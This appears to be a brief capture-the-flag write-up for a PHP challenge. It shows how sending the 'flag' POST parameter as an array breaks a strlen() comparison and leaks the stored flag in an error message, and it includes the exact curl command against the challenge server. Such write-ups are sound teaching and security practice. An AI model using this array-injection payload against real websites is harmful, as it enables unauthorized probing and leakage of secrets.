The goal of this challenge is to bypass an check with the flag from user input and an flag stored in a file
Here is the check:

```php
 if (strlen($_POST['flag']) != strlen($flag))
```

We can observe that the $_POST['flag'] is not sanitized and verified first.
An HTTP POST or GET variable can also be an array using this syntax: flag[1]=a
We can crash with that the page and get the flag in the error message using this command:
```bash
curl http://challenges1.thcon.party:529/ -X POST --data 'flag[1]=a'
```
